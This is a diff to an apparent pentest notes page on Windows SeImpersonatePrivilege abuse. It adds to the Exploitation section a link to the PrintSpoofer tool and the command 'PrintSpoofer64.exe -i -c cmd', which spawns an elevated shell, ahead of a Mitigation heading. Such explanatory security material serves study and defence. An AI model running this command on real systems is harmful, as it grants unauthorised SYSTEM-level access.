@@ -112,8 +112,15 @@ Outcome:
 
 ## Exploitation
 
-To abuse this vulnerability you should follow these steps:
+To abuse this vulnerability you should use the [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) tool:
 
+```
+PrintSpoofer64.exe -i -c cmd
+```
+
+Outcome:
+
+![SeImpersonatePrivilege-Exploitation](/Pictures/SeImpersonatePrivilege-Exploitation.png)
 
 ## Mitigation
 
